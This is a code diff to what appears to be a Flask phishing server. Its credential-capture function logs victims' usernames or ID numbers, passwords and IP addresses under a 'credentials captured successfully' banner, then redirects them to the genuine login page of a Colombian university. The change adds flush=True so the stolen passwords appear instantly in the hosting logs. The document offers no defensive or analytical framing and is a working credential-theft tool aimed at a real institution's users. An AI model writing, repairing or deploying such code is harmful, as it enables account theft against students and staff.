@@ -16,13 +16,14 @@ def capturar_credenciales():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    print("\n" + "="*60)
-    print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
-    print(f"📅 Fecha y Hora: {fecha}")
-    print(f"🌐 IP de la Víctima: {ip}")
-    print(f"👤 Usuario / Documento: {usuario}")
-    print(f"🔑 Contraseña: {clave}")
-    print("="*60 + "\n")
+    # El parámetro flush=True fuerza a que aparezca en los logs de Render al instante
+    print("\n" + "="*60, flush=True)
+    print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨", flush=True)
+    print(f"📅 Fecha y Hora: {fecha}", flush=True)
+    print(f"🌐 IP de la Víctima: {ip}", flush=True)
+    print(f"👤 Usuario / Documento: {usuario}", flush=True)
+    print(f"🔑 Contraseña: {clave}", flush=True)
+    print("="*60 + "\n", flush=True)
     
     return redirect('https://sigedin.uniputumayo.edu.co/login', code=302)
 
